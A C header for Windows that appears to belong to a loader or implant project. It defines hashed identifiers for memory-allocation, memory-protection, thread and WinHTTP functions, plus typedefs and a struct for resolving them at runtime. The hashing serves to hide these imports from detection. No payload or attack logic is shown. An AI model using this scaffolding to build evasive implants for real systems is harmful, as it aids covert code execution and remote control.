#pragma once
#include <windows.h>





#define HASHED_LocalAlloc     0x73cebc5b
#define HASHED_LocalFree      0xa66df372

#define HASHED_LocalReAlloc   0xabad9db2
#define HASHED_GetProcAddress 0xcf31bb1f
#define HASHED_LoadLibraryA   0x5fbff0fb
#define HASHED_FreeLibrary    0x30eece3c

#define HASHED_RtlExitUserThread 0x8e492b88
#define NTALLOCATEVIRTUALMEMORY_HASH 0x6793c34c
#define NTPROTECTVIRTUALMEMORY_HASH  0x082962c8
#define NTFLUSHINSTRUCTIONCACHE_HASH 0x80183adf


#define HASHED_ntdll         0x22d3b5ed
#define HASHED_kernel32      0x7040ee75

#define HASHED_WinHttpOpen               0x5e4f39e5
#define HASHED_WinHttpConnect            0x7242c17d
#define HASHED_WinHttpOpenRequest        0xeab7b9ce
#define HASHED_WinHttpAddRequestHeaders  0xed7fcb41
#define HASHED_WinHttpSendRequest        0xb183faa6
#define HASHED_WinHttpReceiveResponse    0x146c4925
#define HASHED_WinHttpQueryHeaders       0x389cefa5
#define HASHED_WinHttpQueryDataAvailable 0x34cb8684
#define HASHED_WinHttpReadData           0x7195e4e9
#define HASHED_WinHttpSetOption          0xa18b94f8
#define HASHED_WinHttpCloseHandle        0x36220cd5

#define HASHED_CreateThread                0x7f08f451
#define HASHED_NtFreeVirtualMemory         0x471aa7e9
#define HASHED_RegisterWaitForSingleObject 0xccf99aff
#define HASHED_UnregisterWait              0x9b9c8042
#define HASHED_CloseHandle                 0x3870ca07

typedef HLOCAL(WINAPI *pLocalAlloc)(UINT uFlags, SIZE_T uBytes);
typedef HLOCAL(WINAPI* pLocalReAlloc)(HLOCAL hMem, SIZE_T uBytes, UINT uFlags);
typedef HLOCAL(WINAPI *pLocalFree)(HLOCAL);
typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);
typedef HMODULE(WINAPI* pLoadLibraryA)(LPCSTR dllName);


#define HINTERNET LPVOID

typedef HINTERNET(WINAPI* pWinHttpOpen)(LPCWSTR pszAgentW, DWORD dwAccessType, LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags);
typedef HINTERNET(WINAPI* pWinHttpConnect)(HINTERNET hSession, LPCWSTR pswzServerName, WORD nServerPort, DWORD dwReserved);
typedef HINTERNET(WINAPI* pWinHttpOpenRequest)(HINTERNET hConnect, LPCWSTR pwzsVerb, LPCWSTR lpszObjectName, LPCWSTR pwszVersion, LPCWSTR pwszReferrer, LPCWSTR* ppwszAcceptTypes, DWORD dwFlags);
typedef BOOL     (WINAPI* pWinHttpAddRequestHeaders)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers);
typedef BOOL     (WINAPI* pWinHttpSendRequest)(HINTERNET hRequest, LPCWSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptinalLength, DWORD dwTotalLength, DWORD_PTR dwContext);
typedef BOOL     (WINAPI* pWinHttpReceiveResponse)(HINTERNET hRequest, LPVOID lpReserved);
typedef BOOL     (WINAPI* pWinHttpQueryHeaders)(HINTERNET hRequest, DWORD dwInfoLevel, LPCWSTR pwszName, LPVOID lpBuffer, LPDWORD lpdwBufferLength, LPDWORD lpdwIndex);
typedef BOOL     (WINAPI* pWinHttpQueryDataAvailable)(HINTERNET hRequest, LPDWORD lpdwNumberOfBytesAvailable);
typedef BOOL     (WINAPI* pWinHttpReadData)(HINTERNET hRequest, LPVOID dwBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead);
typedef BOOL     (WINAPI* pWinHttpSetOption)(HINTERNET hInternet, DWORD dwOption, LPVOID lpBuffer, DWORD dwBufferLength);
typedef BOOL     (WINAPI* pWinHttpCloseHandle)(HINTERNET hInternet);



typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(
    HANDLE    ProcessHandle,
    PVOID     *BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T   RegionSize,
    ULONG     AllocationType,
    ULONG     Protect
);

typedef NTSTATUS (NTAPI *pNtProtectVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   *BaseAddress,
    PSIZE_T RegionSize,
    ULONG   NewProtect,
    PULONG  OldProtect
);
typedef VOID(NTAPI *pRtlExitUserThread)(NTSTATUS ExitStatus);

typedef NTSTATUS (NTAPI *pNtFlushInstructionCache)(
    HANDLE  ProcessHandle,
    PVOID   BaseAddress,
    SIZE_T  Length
);
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(
    HANDLE  ProcessHandle,
    PVOID   *BaseAddress,
    PSIZE_T RegionSize,
    ULONG   FreeType
);


typedef HANDLE (WINAPI *pCreateThread)(
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);



typedef BOOL (WINAPI *pRegisterWaitForSingleObject)(
    PHANDLE            phNewWaitObject,
    HANDLE             hObject,
    WAITORTIMERCALLBACK Callback,
    PVOID              Context,
    ULONG              dwMilliseconds,
    ULONG              dwFlags
);

typedef BOOL (WINAPI *pUnregisterWait)(HANDLE WaitHandle);

typedef BOOL (WINAPI *pCloseHandle)(HANDLE hObject);
typedef BOOL (WINAPI *pFreeLibrary)(HMODULE hLibModule);



typedef struct _Win32 {
    // win32
    pLocalAlloc      LocalAlloc;
    pLocalFree       LocalFree;
    pLocalReAlloc    LocalReAlloc;
    pGetProcAddress  GetProcAddress;
    pLoadLibraryA    LoadLibraryA;
    pUnregisterWait  UnregisterWait;
    pRegisterWaitForSingleObject RegisterWaitForSingleObject;
    pCloseHandle CloseHandle;
    pCreateThread CreateThread;
    pFreeLibrary FreeLibrary;


    pRtlExitUserThread RtlExitUserThread;
    pNtProtectVirtualMemory NtProtectVirtualMemory;
    pNtAllocateVirtualMemory NtAllocateVirtualMemory;
    pNtFlushInstructionCache NtFlushInstructionCache;
    pNtFreeVirtualMemory NtFreeVirtualMemory;

    // winhttp
    pWinHttpOpen               WinHttpOpen;
    pWinHttpConnect            WinHttpConnect;
    pWinHttpOpenRequest        WinHttpOpenRequest;
    pWinHttpAddRequestHeaders  WinHttpAddRequestHeaders;
    pWinHttpSendRequest        WinHttpSendRequest;
    pWinHttpReceiveResponse    WinHttpReceiveResponse;
    pWinHttpQueryHeaders       WinHttpQueryHeaders;
    pWinHttpQueryDataAvailable WinHttpQueryDataAvailable;
    pWinHttpReadData           WinHttpReadData;
    pWinHttpSetOption          WinHttpSetOption;
    pWinHttpCloseHandle        WinHttpCloseHandle;
} Win32, *PWin32;

typedef struct _Modules {
    HMODULE ntdll;
    HMODULE kernel32;
    HMODULE winhttp;
} Modules;
